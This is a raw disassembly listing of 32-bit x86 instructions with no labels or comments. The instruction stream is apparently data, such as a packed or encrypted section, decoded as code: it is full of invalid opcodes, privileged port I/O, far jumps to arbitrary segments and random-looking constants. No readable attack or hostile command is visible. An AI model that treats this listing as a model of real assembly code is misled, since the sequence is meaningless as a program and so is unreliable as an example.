  41a2d5:	xor    ecx,DWORD PTR [edi-0x6d]
  41a2d8:	ins    DWORD PTR es:[edi],dx
  41a2d9:	mov    edx,0x490ffa23
  41a2de:	or     DWORD PTR [esi+ecx*2+0x7c489c29],esi
  41a2e5:	inc    ebx
  41a2e6:	add    al,BYTE PTR [esi+0x15]
  41a2e9:	xchg   BYTE PTR [edx+esi*8-0x21befcc3],bl
  41a2f0:	cmp    DWORD PTR [esi+0x116c2af7],0xffffffbb
  41a2f7:	jmp    0xd8ab:0x2fe45436
  41a2fe:	clc    
  41a2ff:	fistp  WORD PTR [ebx-0x79]
  41a302:	jae    0x41a342
  41a304:	mov    WORD PTR [esi],gs
  41a306:	xchg   BYTE PTR gs:[ecx],cl
  41a309:	mov    ecx,0x1df4c0b5
  41a30e:	push   esi
  41a30f:	into   
  41a310:	push   ebx
  41a311:	bound  eax,QWORD PTR [esi-0x1b]
  41a314:	mov    DWORD PTR [esi+0xe88ff69],eax
  41a31a:	xor    al,0x18
  41a31c:	lgs    ebx,FWORD PTR [ecx+0x28]
  41a320:	sub    esp,DWORD PTR [eax]
  41a322:	or     ebp,DWORD PTR [edx-0x64]
  41a325:	in     eax,0x95
  41a327:	retf   0xeec3
  41a32a:	int3   
  41a32b:	hlt    
  41a32c:	mov    dl,0xfd
  41a32e:	test   BYTE PTR [esp+eiz*2+0x71781e69],0x92
  41a336:	(bad)  
  41a337:	in     al,0x97
  41a339:	call   0xada2:0xadcbd689
  41a340:	not    BYTE PTR [eax+0x5532dde2]
  41a346:	and    eax,0x67b5b2f0
  41a34b:	jns    0x41a2e5
  41a34d:	cdq    
  41a34e:	jp     0x41a2e7
  41a350:	sar    al,cl
  41a352:	sbb    esp,esi
  41a354:	lods   al,BYTE PTR ds:[esi]
  41a355:	jno    0x41a2df
  41a357:	cmp    al,0x81
  41a359:	call   0x23ec57e0
  41a35e:	add    eax,0x5ee8a245
  41a363:	pop    ss
  41a364:	mov    ds:0xd859d7ef,eax
  41a369:	pop    edx
  41a36a:	inc    edi
  41a36b:	rol    BYTE PTR [ebx+0x764d141d],cl
  41a371:	ret    
  41a372:	jp     0x41a3a3
  41a374:	lea    ebx,[esi]
  41a376:	lea    ecx,[ebx+0x74]
  41a379:	push   edx
  41a37a:	hlt    
  41a37b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a37c:	test   al,bh
  41a37e:	cmp    BYTE PTR [esi],bh
  41a380:	icebp  
  41a381:	ror    DWORD PTR [edi+0x654b5b4d],0x70
  41a388:	sub    dl,BYTE PTR [eax]
  41a38a:	jae    0x41a37b
  41a38c:	aad    0xb
  41a38e:	sbb    BYTE PTR [ebp-0x6d],ch
  41a391:	js     0x41a37f
  41a393:	jno    0x41a3c9
  41a395:	outs   dx,BYTE PTR ds:[esi]
  41a396:	retf   
  41a397:	and    ebx,DWORD PTR [eax+ecx*1-0x3f9cb9c2]
  41a39e:	js     0x41a3d3
  41a3a0:	pop    esp
  41a3a1:	mov    ecx,0x96e7da37
  41a3a6:	pop    ecx
  41a3a7:	mov    eax,ds:0xfeae2ad4
  41a3ac:	out    0xc4,eax
  41a3ae:	jl     0x41a40f
  41a3b0:	and    DWORD PTR [edi+0x66],0x79ae40f0
  41a3b7:	shl    BYTE PTR [edx+0x73513510],1
  41a3bd:	pop    es
  41a3be:	(bad)  
  41a3bf:	stc    
  41a3c0:	(bad)  
  41a3c2:	mov    WORD PTR [ebx+edx*8+0x18],cs
  41a3c6:	mov    al,0x41
  41a3c8:	xchg   ebp,eax
  41a3c9:	(bad)  
  41a3ca:	outs   dx,DWORD PTR ds:[esi]
  41a3cb:	ror    ebp,cl
  41a3cd:	call   0x406faac6
  41a3d2:	inc    eax
  41a3d3:	mov    edi,ebx
  41a3d5:	xor    eax,0xdf1f0e3
  41a3da:	in     al,dx
  41a3db:	sub    edx,DWORD PTR [ebx+0x495cf4fe]
  41a3e1:	inc    ecx
  41a3e2:	test   BYTE PTR [eax],0xfc
  41a3e5:	or     DWORD PTR [eax],0x15d625d0
  41a3eb:	out    0x29,eax
  41a3ed:	ins    BYTE PTR es:[edi],dx
  41a3ee:	push   eax
  41a3ef:	sbb    al,0xde
  41a3f1:	mov    DWORD PTR [ebx-0x6b1f3842],0x89513fcc
  41a3fb:	mov    al,ss:0xbd7ab9a3
  41a401:	jns    0x41a39e
  41a403:	sbb    al,BYTE PTR [edi+0x5b]
  41a406:	mov    DWORD PTR [ebp-0x5c],edx
  41a409:	mov    WORD PTR [ebx],ss
  41a40b:	xchg   DWORD PTR [esi+0x705f298b],eax
  41a411:	mov    esp,0x54739d31
  41a416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a417:	xor    edi,ebx
  41a419:	xor    esp,DWORD PTR [edx+0x1b]
  41a41c:	sahf   
  41a41d:	xchg   edx,eax
  41a41e:	dec    ebx
  41a41f:	inc    esi
  41a420:	dec    esp
  41a421:	lock loope 0x41a42f
  41a424:	stos   BYTE PTR es:[edi],al
  41a425:	adc    DWORD PTR [edx+0x33],edx
  41a428:	ret    0x3279
  41a42b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a42c:	out    0xe5,al
  41a42e:	aad    0xc5
  41a430:	bnd ret 
  41a432:	adc    BYTE PTR [ebp+0x161dd1c4],dh
  41a438:	ins    DWORD PTR es:[edi],dx
  41a439:	pusha  
  41a43a:	pop    edi
  41a43b:	xor    BYTE PTR [edx+0x4e07f5b8],al
  41a441:	adc    eax,esi
  41a443:	sbb    ah,dl
  41a445:	mov    WORD PTR [esi-0x63],?
  41a448:	jle    0x41a4c0
  41a44a:	fs mov ds,edi
  41a44d:	(bad)  
  41a44e:	xor    ch,BYTE PTR ds:0x27ba3a72
  41a454:	adc    BYTE PTR [edx+0x5f],cl
  41a457:	jb     0x41a416
  41a459:	sub    DWORD PTR [edx-0x9663140],eax
  41a45f:	mov    ds:0x136c2235,eax
  41a464:	add    eax,0xa44c31e8
  41a469:	sbb    BYTE PTR ds:[ebx+0x4a],dl
  41a46d:	es pushf 
  41a46f:	scas   eax,DWORD PTR es:[edi]
  41a470:	loope  0x41a407
  41a472:	dec    edi
  41a473:	inc    edx
  41a474:	and    BYTE PTR [ebp+ebx*2-0x4ac08778],0xfe
  41a47c:	sub    eax,0xbbecad22
  41a481:	pop    edx
  41a482:	adc    DWORD PTR [esi-0x45],0xd415dffe
  41a489:	pop    ds
  41a48a:	or     eax,DWORD PTR [ecx+0x5d]
  41a48d:	and    al,0x31
  41a48f:	outs   dx,DWORD PTR ds:[esi]
  41a490:	fisttp QWORD PTR [ebx-0x2840d739]
  41a496:	ins    BYTE PTR es:[edi],dx
  41a497:	lods   eax,DWORD PTR ds:[esi]
  41a498:	sahf   
  41a499:	not    DWORD PTR [ecx+edx*1-0x5779f63]
  41a4a0:	cmp    al,0x6
  41a4a2:	and    al,0xe7
  41a4a4:	into   
  41a4a5:	sbb    BYTE PTR [eax-0x14],bl
  41a4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4a9:	mov    ds:0x65ec6137,eax
  41a4ae:	int3   
  41a4af:	pop    ds
  41a4b0:	jo     0x41a4f1
  41a4b2:	ficomp DWORD PTR [esi+0x67]
  41a4b5:	jle    0x41a44d
  41a4b7:	call   0xcc861f1f
  41a4bc:	cmp    ch,dl
  41a4be:	xchg   esp,eax
  41a4bf:	mov    esi,0x84da24f3
  41a4c4:	adc    ch,dl
  41a4c6:	jne    0x41a4f4
  41a4c8:	inc    ebx
  41a4c9:	xchg   edi,eax
  41a4ca:	in     al,dx
  41a4cb:	rcr    DWORD PTR [edi-0x5437b3bf],cl
  41a4d1:	mov    BYTE PTR [ebx+0x28],ah
  41a4d4:	call   0x4a88:0xd3ba640b
  41a4db:	xchg   esp,eax
  41a4dc:	jno    0x41a516
  41a4de:	jge    0x41a4ad
  41a4e0:	dec    esi
  41a4e1:	js     0x41a492
  41a4e3:	jnp    0x41a491
  41a4e5:	stos   DWORD PTR es:[edi],eax
  41a4e6:	pushf  
  41a4e7:	cmp    DWORD PTR [edi-0x5b608e5d],esp
  41a4ed:	xchg   edi,edx
  41a4ef:	sahf   
  41a4f0:	inc    edx
  41a4f1:	cmc    
  41a4f2:	out    dx,al
  41a4f3:	mov    ds,WORD PTR [edi+0x5a5729b4]
  41a4f9:	inc    edx
  41a4fa:	push   esi
  41a4fb:	(bad)  
  41a4fc:	rcr    DWORD PTR [ebx+0x1f],cl
  41a4ff:	dec    edi
  41a500:	mov    esi,0x3e11399d
  41a505:	sub    esi,ebx
  41a507:	leave  
  41a508:	sub    BYTE PTR [edi],0xe1
  41a50b:	xchg   ecx,eax
  41a50c:	ja     0x41a4bf
  41a50e:	dec    edi
  41a50f:	addr16 and eax,0x461bb2
  41a515:	jmp    0x41a4e2
  41a517:	mov    ecx,0x7a27daa
  41a51c:	lahf   
  41a51d:	sar    BYTE PTR [edx],1
  41a51f:	stos   DWORD PTR es:[edi],eax
  41a520:	pop    ecx
  41a521:	stos   BYTE PTR es:[edi],al
  41a522:	not    BYTE PTR [edi+eiz*2+0x29]
  41a526:	les    edx,FWORD PTR [ebx+ecx*2]
  41a529:	dec    eax
  41a52a:	ret    
  41a52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a52c:	shr    ch,cl
  41a52e:	mov    dl,0x6a
  41a530:	dec    edx
  41a531:	sub    BYTE PTR [eax],dh
  41a533:	loope  0x41a526
  41a535:	jae    0x41a52d
  41a537:	adc    edi,esi
  41a539:	mov    ah,0x2
  41a53b:	add    ebp,DWORD PTR [edi]
  41a53d:	mov    al,ds:0xeaf19820
  41a542:	dec    eax
  41a543:	mov    ecx,fs
  41a545:	mov    ecx,0x56b8512c
  41a54a:	fmul   DWORD PTR [esi-0x33206ce7]
  41a550:	pop    es
  41a551:	sbb    al,0xfa
  41a553:	mov    esi,0x9fc3c498
  41a558:	mov    bh,BYTE PTR [esi+0x93e67b4]
  41a55e:	fdiv   QWORD PTR [esi-0x43dba196]
  41a564:	scas   al,BYTE PTR es:[edi]
  41a565:	cmp    DWORD PTR [ebx+eax*4-0x5e7ee3cb],esp
  41a56c:	bnd jnp 0x41a55c
  41a56f:	lock mov ebx,0x7e17bae5
  41a575:	sbb    edx,DWORD PTR [ebp+0x7fdbe85e]
  41a57b:	push   edx
  41a57c:	pop    ecx
  41a57d:	mov    al,0xa
  41a57f:	not    DWORD PTR [esi]
  41a581:	mov    ebp,0xb052fee0
  41a586:	mov    ebx,0x7579994
  41a58b:	shr    BYTE PTR [edx+edx*2+0x76],cl
  41a58f:	add    DWORD PTR [ecx+eax*1+0x6b],ebx
  41a593:	lock daa 
  41a595:	cmp    al,0xfc
  41a597:	outs   dx,BYTE PTR ds:[esi]
  41a598:	xchg   edx,eax
  41a599:	adc    bh,bl
  41a59b:	lea    edx,[edi+0x72f44437]
  41a5a1:	pop    edi
  41a5a2:	hlt    
  41a5a3:	cli    
  41a5a4:	xor    eax,0xc5be1a85
  41a5a9:	or     DWORD PTR [edx],edx
  41a5ab:	and    eax,0xc11dcd77
  41a5b0:	xlat   BYTE PTR ds:[ebx]
  41a5b1:	jnp    0x41a5a9
  41a5b3:	ds dec edi
  41a5b5:	cmp    al,0xe0
  41a5b7:	imul   BYTE PTR [ecx-0x2b]
  41a5ba:	push   0xf0f68045
  41a5bf:	cmp    ch,BYTE PTR [eax+edi*1+0x34]
  41a5c3:	retf   
  41a5c4:	pop    esi
  41a5c5:	add    BYTE PTR [edi],bl
  41a5c7:	sbb    ebp,DWORD PTR [edx]
  41a5c9:	xor    DWORD PTR [ebx-0x65],ebp
  41a5cc:	sbb    eax,0x34ae971f
  41a5d1:	leave  
  41a5d2:	js     0x41a5c7
  41a5d4:	lock mov bl,0x6e
  41a5d7:	or     BYTE PTR [ecx],0xa
  41a5da:	push   edx
  41a5db:	hlt    
  41a5dc:	inc    esp
  41a5dd:	in     al,dx
  41a5de:	jne    0x41a5e9
  41a5e0:	mov    ds:0x37ee2c2e,eax
  41a5e5:	xor    ebp,0x45
  41a5e8:	daa    
  41a5e9:	jmp    0x81eb:0xd9544baa
  41a5f0:	in     al,0x9a
  41a5f2:	int3   
  41a5f3:	dec    dh
  41a5f5:	lea    esp,[esi]
  41a5f7:	and    DWORD PTR [edi+0x24],ecx
  41a5fa:	xchg   edx,eax
  41a5fb:	(bad)  
  41a5fc:	mov    eax,ds:0x1a3eb580
  41a601:	clc    
  41a602:	push   edi
  41a603:	es push edi
  41a605:	pusha  
  41a606:	sbb    al,0xb5
  41a608:	call   eax
  41a60a:	push   es
  41a60b:	jb     0x41a594
  41a60d:	xchg   edx,eax
  41a60e:	jp     0x41a5c8
  41a610:	shl    ebx,0x49
  41a613:	fs stos DWORD PTR es:[edi],eax
  41a615:	lock inc ecx
  41a617:	(bad)  
  41a618:	mov    esp,0x8f5ef275
  41a61d:	jae    0xe1398a30
  41a623:	shl    DWORD PTR [eax+0x25],cl
  41a626:	stc    
  41a627:	push   ss
  41a628:	or     eax,DWORD PTR [edx+0x67]
  41a62b:	cdq    
  41a62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a62d:	xchg   esi,eax
  41a62e:	je     0x41a60b
  41a630:	dec    esi
  41a631:	and    dh,BYTE PTR [ebx+0x1982bcf0]
  41a637:	push   es
  41a638:	ja     0x41a62c
  41a63a:	pushf  
  41a63b:	cdq    
  41a63c:	pop    ebx
  41a63d:	push   cs
  41a63e:	mov    esi,0x2a401ab
  41a643:	test   BYTE PTR [ebx],bl
  41a645:	(bad)  
  41a646:	aas    
  41a647:	call   0x806e:0x7077964c
  41a64e:	fbstp  TBYTE PTR [ebx-0x45]
  41a651:	and    edi,DWORD PTR [edx+eiz*2-0x6147d078]
  41a658:	imul   esp,esi,0x73
  41a65b:	div    DWORD PTR [edi]
  41a65d:	or     eax,0x80ca88e9
  41a662:	adc    eax,0x15d28aae
  41a667:	cmp    DWORD PTR [esi+0x41],eax
  41a66a:	xchg   ebp,eax
  41a66b:	lock imul BYTE PTR [esi+0x3]
  41a66f:	xor    bl,ch
  41a671:	mov    bl,0xf8
  41a673:	adc    eax,0xb11dbbd4
  41a678:	ja     0x41a661
  41a67a:	cld    
  41a67b:	lds    edi,FWORD PTR [ebp-0x34]
  41a67e:	xor    al,0x4
  41a680:	nop
  41a681:	test   ah,bh
  41a683:	dec    ebp
  41a684:	repnz inc edi
  41a686:	out    dx,al
  41a687:	xor    ebx,esp
  41a689:	cmp    ah,BYTE PTR [ebx-0x16f6be6e]
  41a68f:	ja     0x41a6ef
  41a691:	in     eax,0x7c
  41a693:	jge    0x41a6d7
  41a695:	adc    BYTE PTR [ebx+ebx*2],cl
  41a698:	and    ebx,ebp
  41a69a:	sahf   
  41a69b:	mov    eax,DWORD PTR [edx]
  41a69d:	je     0x41a680
  41a69f:	ja     0x41a70e
  41a6a1:	mov    cl,0x16
  41a6a3:	mov    DWORD PTR [ecx+eax*2+0x40],eax
  41a6a7:	lahf   
  41a6a8:	push   ecx
  41a6a9:	scas   al,BYTE PTR es:[edi]
  41a6aa:	add    BYTE PTR [esi+0x1341514b],0xc9
  41a6b1:	xchg   edi,eax
  41a6b2:	or     esi,esp
  41a6b4:	fbstp  TBYTE PTR [esi]
  41a6b6:	cmp    esi,DWORD PTR [ecx]
  41a6b8:	dec    edx
  41a6b9:	in     eax,0x45
  41a6bb:	add    cl,bl
  41a6bd:	or     bl,BYTE PTR [eax]
  41a6bf:	push   esp
  41a6c0:	mov    dl,0x98
  41a6c2:	mov    bh,0x69
  41a6c4:	(bad)  
  41a6c5:	pop    edx
  41a6c6:	pop    ecx
  41a6c7:	bound  ecx,QWORD PTR [esi+edx*2]
  41a6ca:	mov    dh,0x78
  41a6cc:	call   0x4b93:0x63513244
  41a6d3:	xor    DWORD PTR [ebx+edx*2+0x28],esp
  41a6d7:	fwait
  41a6d8:	push   ecx
  41a6d9:	mov    ebp,0xe9810c82
  41a6de:	mov    ch,0xfe
  41a6e0:	dec    esi
  41a6e1:	in     al,0x1a
  41a6e3:	pusha  
  41a6e4:	jb     0x41a6d8
  41a6e6:	imul   eax,DWORD PTR [esi-0x223ff14],0x47
  41a6ed:	cdq    
  41a6ee:	push   edi
  41a6ef:	and    al,0xbb
  41a6f1:	inc    ecx
  41a6f2:	pop    ebx
  41a6f3:	aad    0x32
  41a6f5:	jmp    0x41a69e
  41a6f7:	repz sbb BYTE PTR [edx+0x37b89670],bh
  41a6fe:	sub    ecx,ebp
  41a700:	sub    al,0x6c
  41a702:	fidiv  DWORD PTR ds:0xb2680db3
  41a708:	fmul   DWORD PTR [esi]
  41a70a:	inc    edi
  41a70b:	(bad)  [esp+esi*2-0x534265f0]
  41a712:	mov    BYTE PTR [edx+0x4],cl
  41a715:	out    0x2f,al
  41a717:	enter  0x4097,0xa0
  41a71b:	pop    es
  41a71c:	jl     0x41a790
  41a71e:	xor    BYTE PTR [eax],bh
  41a720:	cld    
  41a721:	fwait
  41a722:	mov    eax,ds:0xb41245e7
  41a727:	std    
  41a728:	scas   al,BYTE PTR es:[edi]
  41a729:	fcom   DWORD PTR [esi]
  41a72b:	in     al,dx
  41a72c:	(bad)  
  41a72e:	add    al,BYTE PTR [eax+0xd]
  41a731:	cmp    DWORD PTR [ecx+0x133bc03],edx
  41a737:	mov    ebx,ebp
  41a739:	mov    ds:0xc85e02a6,al
  41a73e:	sbb    esi,DWORD PTR [eax]
  41a740:	shl    ch,cl
  41a742:	or     DWORD PTR [esi],0xfabbb605
  41a748:	lods   al,BYTE PTR ds:[esi]
  41a749:	push   esi
  41a74a:	cmp    DWORD PTR [edi-0x5b],esi
  41a74d:	mov    ebx,0x9c7abbd3
  41a752:	xchg   ecx,eax
  41a753:	mov    dl,0x74
  41a755:	jge    0x41a74f
  41a757:	stos   DWORD PTR es:[edi],eax
  41a758:	sbb    DWORD PTR [eax+0x7c],ebp
  41a75b:	pop    ss
  41a75c:	mov    al,ds:0x2ae74eaa
  41a761:	int    0xdb
  41a763:	push   0xffffff96
  41a765:	add    al,0xfa
  41a767:	pushf  
  41a768:	mov    eax,ds:0x945efc20
  41a76d:	pop    ebp
  41a76e:	rcr    DWORD PTR [esi+ebp*8-0x2e],0x5d
  41a773:	pop    ebp
  41a774:	jl     0x41a71d
  41a776:	sahf   
  41a777:	rol    BYTE PTR [ecx*2-0x2d2f9d0d],0x89
  41a77f:	imul   edi,DWORD PTR [edi+0x62],0x7c434a33
  41a786:	test   al,0xb7
  41a788:	call   0xb8b4:0x556c973c
  41a78f:	mov    edi,0x8e460e7b
  41a794:	jecxz  0x41a724
  41a796:	rcl    al,0xbe
  41a799:	(bad)  
  41a79a:	and    dh,BYTE PTR [eax+0xec16fac]
  41a7a0:	in     al,0x7b
  41a7a2:	retf   0x4207
  41a7a5:	rcl    edi,cl
  41a7a7:	mov    al,ds:0xae1d63ba
  41a7ac:	cmp    edx,DWORD PTR [edi+ebp*4+0xe4a8974]
  41a7b3:	adc    eax,0xddeae935
  41a7b8:	jbe    0x41a740
  41a7ba:	push   0xdc4c1016
  41a7bf:	pop    esp
  41a7c0:	pop    es
  41a7c1:	imul   esi,esi,0x52
  41a7c4:	call   0x728c:0x4cc2e86d
  41a7cb:	adc    eax,0x877d6f54
  41a7d0:	mov    esi,0x53d8adc
  41a7d5:	xor    bh,BYTE PTR [edi+0x9]
  41a7d8:	ror    BYTE PTR [ebx-0x4e],1
  41a7db:	or     esp,0xfffffff8
  41a7de:	mov    al,ds:0xc8b17b0f
  41a7e3:	sub    eax,0x272b3f6f
  41a7e8:	push   esp
  41a7e9:	add    al,0x76
  41a7eb:	je     0x41a84e
  41a7ed:	cmp    edx,DWORD PTR [edi+edi*8+0x4a381a43]
  41a7f4:	sti    
  41a7f5:	mov    ebx,0xda4e9d40
  41a7fa:	mov    bl,0x9e
  41a7fc:	mov    al,ds:0xac548b4
  41a801:	repnz or dl,0xa1
  41a805:	push   0xffffffce
  41a807:	fwait
  41a808:	loopne 0x41a83f
  41a80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a80b:	xor    ebp,DWORD PTR [eax]
  41a80d:	jo     0x41a7f1
  41a80f:	sub    DWORD PTR ds:0x4797fcb1,esp
  41a815:	mov    al,0xbd
  41a817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a818:	ins    DWORD PTR es:[edi],dx
  41a819:	call   0xbd8961ad
  41a81e:	iret   
  41a81f:	or     al,BYTE PTR [ebp-0x376e1613]
  41a825:	inc    edx
  41a826:	mov    ch,0x4b
  41a828:	(bad)  
  41a82a:	popf   
  41a82b:	aas    
  41a82c:	clc    
  41a82d:	pop    edi
  41a82e:	popa   
  41a82f:	(bad)  
  41a830:	fs xchg edx,eax
  41a832:	lds    edx,FWORD PTR [eax-0x39]
  41a835:	pusha  
  41a836:	imul   edx,DWORD PTR [eax+0x64],0x309f7977
  41a83d:	aam    0xde
  41a83f:	push   ss
  41a840:	ins    BYTE PTR es:[edi],dx
  41a841:	cmp    bh,BYTE PTR [edi+0x8a66409]
  41a847:	pushf  
  41a848:	inc    ecx
  41a849:	arpl   bp,bx
  41a84b:	add    eax,0xe784ad22
  41a850:	push   eax
  41a851:	jbe    0x41a8c8
  41a853:	adc    BYTE PTR [edi+0x5f],0x98
  41a857:	sbb    eax,0x81149d7a
  41a85c:	or     esp,DWORD PTR ds:0x2ba3030c
  41a862:	das    
  41a863:	xchg   edi,eax
  41a864:	sub    al,0x2f
  41a866:	shl    al,1
  41a868:	and    eax,0xdb3a5245
  41a86d:	fcom   DWORD PTR [ebx]
  41a86f:	shl    bl,0x26
  41a872:	or     DWORD PTR [edx],eax
  41a874:	ret    0x6563
  41a877:	nop
  41a878:	and    bl,BYTE PTR [si-0x3a98]
  41a87d:	mov    ch,0xb5
  41a87f:	push   cs
  41a880:	mov    al,ds:0x46a6f8ec
  41a885:	sbb    edi,edx
  41a887:	sub    edi,esi
  41a889:	or     al,BYTE PTR [edx]
  41a88b:	sub    dh,BYTE PTR [ebx]
  41a88d:	ss inc ecx
  41a88f:	aad    0xb
  41a891:	paddw  mm4,QWORD PTR [ebx-0x4ff7eae8]
  41a898:	jbe    0x41a831
  41a89a:	adc    al,0xf7
  41a89c:	out    0xc6,eax
  41a89e:	in     al,dx
  41a89f:	sbb    eax,0x209d1112
  41a8a4:	xchg   eax,esi
  41a8a6:	loop   0x41a8dd
  41a8a8:	test   BYTE PTR [ebx+0x399501dc],cl
  41a8ae:	mov    esp,0x1652e9f0
  41a8b3:	and    eax,0xfcbf5ca0
  41a8b8:	sub    dl,BYTE PTR [edi+edi*8+0x29fc7c09]
  41a8bf:	dec    edx
  41a8c0:	addr16 nop
  41a8c2:	jg     0x41a919
  41a8c4:	lea    esi,[ecx-0x57fe9595]
  41a8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8cb:	xlat   BYTE PTR ds:[ebx]
  41a8cc:	sub    ebx,DWORD PTR [ecx-0x2f]
  41a8cf:	call   0x581bfc74
  41a8d4:	sub    ah,dh
  41a8d6:	sub    edx,DWORD PTR [edx-0x31033f37]
  41a8dc:	mov    ds:0xd3d785fe,al
  41a8e1:	(bad)  
  41a8e2:	fs cld 
  41a8e4:	lds    ebx,FWORD PTR ds:0x9ce29414
  41a8ea:	jno    0x41a8fc
  41a8ec:	cli    
  41a8ed:	push   ebp
  41a8ee:	cmp    BYTE PTR [ebp+eax*8+0x27],ch
  41a8f2:	fidiv  DWORD PTR [esi]
  41a8f4:	sub    eax,0x3d6909d6
  41a8f9:	out    dx,eax
  41a8fa:	fwait
  41a8fb:	mov    ebp,0xd1aa5941
  41a900:	pop    esi
  41a901:	lods   eax,DWORD PTR ds:[esi]
  41a902:	adc    DWORD PTR [ebp-0x438bd01],edi
  41a908:	jp     0x41a97e
  41a90a:	push   0xfffffff8
  41a90c:	push   ebp
  41a90d:	xor    eax,0x95dd6420
  41a912:	adc    bh,BYTE PTR [eax+0x359a617b]
  41a918:	mov    al,0x6f
  41a91a:	es inc esp
  41a91c:	push   es
  41a91d:	jle    0x41a92a
  41a91f:	jmp    0x54ecef5
  41a924:	out    dx,eax
  41a925:	xor    DWORD PTR [ebx-0x4e],ebx
  41a928:	push   0xffffffee
  41a92a:	mov    bl,0x41
  41a92c:	inc    esp
  41a92d:	jmp    0xacd4:0x8edad7ce
  41a934:	in     eax,0x69
  41a936:	and    eax,0x4778d611
  41a93b:	dec    esp
  41a93c:	mov    al,0x54
  41a93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a93f:	xchg   edx,eax
  41a940:	xchg   esi,eax
  41a941:	dec    esi
  41a942:	outs   dx,DWORD PTR ds:[esi]
  41a943:	inc    eax
  41a944:	jecxz  0x41a8f3
  41a946:	pushf  
  41a947:	xor    eax,0x5992525e
  41a94c:	dec    ebp
  41a94d:	mov    ch,0xe8
  41a94f:	inc    esp
  41a950:	ja     0x41a943
  41a952:	and    al,0x68
  41a954:	dec    ebx
  41a955:	sub    ecx,DWORD PTR [ecx+ebp*8+0x4d]
  41a959:	test   eax,0x4342aa19
  41a95e:	jge    0x41a9af
  41a960:	ins    BYTE PTR es:[edi],dx
  41a961:	sub    BYTE PTR [edi-0x379a7cd8],cl
  41a967:	aas    
  41a968:	cmp    esi,DWORD PTR [esi-0x1]
  41a96b:	sbb    cl,BYTE PTR [edi-0x4a]
  41a96e:	sbb    BYTE PTR [esp+eax*4-0x6b],al
  41a972:	ret    0xc9b8
  41a975:	sbb    bl,bl
  41a977:	repz or eax,0xf998d973
  41a97d:	test   BYTE PTR [ebx-0x6a],dl
  41a980:	ror    BYTE PTR [ebp+esi*4-0x78],cl
  41a984:	jne    0x41a9f7
  41a986:	push   edx
  41a987:	sar    DWORD PTR [ebx],0x53
  41a98a:	popa   
  41a98b:	into   
  41a98c:	jge    0x41a9fb
  41a98e:	shr    DWORD PTR [ecx-0x5f],cl
  41a991:	xor    DWORD PTR [eax],ecx
  41a993:	in     al,dx
  41a994:	xchg   DWORD PTR ds:0xd245c932,edx
  41a99a:	(bad)  
  41a99b:	in     al,0xc4
  41a99d:	arpl   WORD PTR [ebx],ax
  41a99f:	shl    BYTE PTR [edi+eiz*2],0x31
  41a9a3:	test   al,0x3b
  41a9a5:	xor    eax,0xa06bc1c8
  41a9aa:	in     eax,dx
  41a9ab:	addr16 pushw 0x46
  41a9af:	mov    BYTE PTR es:[edx-0x7a],0xe8
  41a9b4:	jb     0x41a984
  41a9b6:	dec    ecx
  41a9b7:	stos   DWORD PTR es:[edi],eax
  41a9b8:	ins    DWORD PTR es:[edi],dx
  41a9b9:	pop    edi
  41a9ba:	jg     0x41aa10
  41a9bc:	dec    edi
  41a9bd:	mov    eax,0x8d08a496
  41a9c2:	out    0x7d,eax
  41a9c4:	inc    ebx
  41a9c5:	leave  
  41a9c6:	mov    al,ds:0x85243b86
  41a9cb:	jne    0x41a9ce
  41a9cd:	mov    edx,0x8fd698ad
  41a9d2:	idiv   DWORD PTR [ebx]
  41a9d4:	inc    eax
  41a9d5:	add    al,bl
  41a9d7:	adc    BYTE PTR [ecx-0x31],ah
  41a9da:	and    dh,BYTE PTR [edx+0x68]
  41a9dd:	sahf   
  41a9de:	push   esi
  41a9df:	mov    WORD PTR [edx+0xe],ss
  41a9e2:	sub    DWORD PTR [edi-0x6baf5b5e],edx
  41a9e8:	ins    DWORD PTR es:[edi],dx
  41a9e9:	jne    0x41aa02
  41a9eb:	fidivr WORD PTR [eax]
  41a9ed:	pop    edx
  41a9ee:	fwait
  41a9ef:	mov    eax,0x11dc1064
  41a9f4:	(bad)  
  41a9f5:	dec    esi
  41a9f6:	mov    ch,0x34
  41a9f8:	xchg   ecx,eax
  41a9f9:	push   ds
  41a9fa:	xor    al,BYTE PTR [esi+0x25]
  41a9fd:	jae    0x41a99f
  41a9ff:	les    eax,FWORD PTR [ecx]
  41aa01:	bound  esi,QWORD PTR [edi+0x1]
  41aa04:	mov    ecx,0xb2f015e5
  41aa09:	xor    eax,0x57a65d8c
  41aa0e:	pop    eax
  41aa0f:	adc    ch,BYTE PTR [eax]
  41aa11:	fcmovu st,st(7)
  41aa13:	es and ecx,esp
  41aa16:	out    0xa7,al
  41aa18:	int    0xc4
  41aa1a:	fidiv  WORD PTR [ebx+0x74]
  41aa1d:	test   BYTE PTR [eax+0x1d],bl
  41aa20:	gs mov ecx,0xe44618a6
  41aa26:	and    DWORD PTR [ecx+0x43],edi
  41aa29:	lods   eax,DWORD PTR ds:[esi]
  41aa2a:	jge    0x41aa33
  41aa2c:	cmp    BYTE PTR [esi+eax*2-0x5a],0xd5
  41aa31:	pop    ds
  41aa32:	add    esi,DWORD PTR gs:[edi]
  41aa35:	rcl    DWORD PTR [ebp-0x46],1
  41aa38:	leave  
  41aa39:	jns    0x41a9c1
  41aa3b:	iret   
  41aa3c:	xchg   edi,eax
  41aa3d:	add    BYTE PTR [ecx+0x1c],bl
  41aa40:	test   BYTE PTR [esi+0x4aedd453],ah
  41aa46:	popa   
  41aa47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa48:	push   ds
  41aa49:	mov    bh,0x47
  41aa4b:	mov    ebx,0xb0c35893
  41aa50:	fmul   st(7),st
  41aa52:	sub    al,BYTE PTR [ecx-0x5b14b2ab]
  41aa58:	retf   
  41aa59:	jmp    0x2880:0x85e31e9
  41aa60:	xchg   edi,eax
  41aa61:	xchg   esp,eax
  41aa62:	mov    esi,0x6fd5dd81
  41aa67:	fdiv   st(6),st
  41aa69:	lods   al,BYTE PTR ds:[esi]
  41aa6a:	retf   0xadce
  41aa6d:	(bad)  
  41aa6e:	mov    eax,DWORD PTR ds:0x4ce106fe
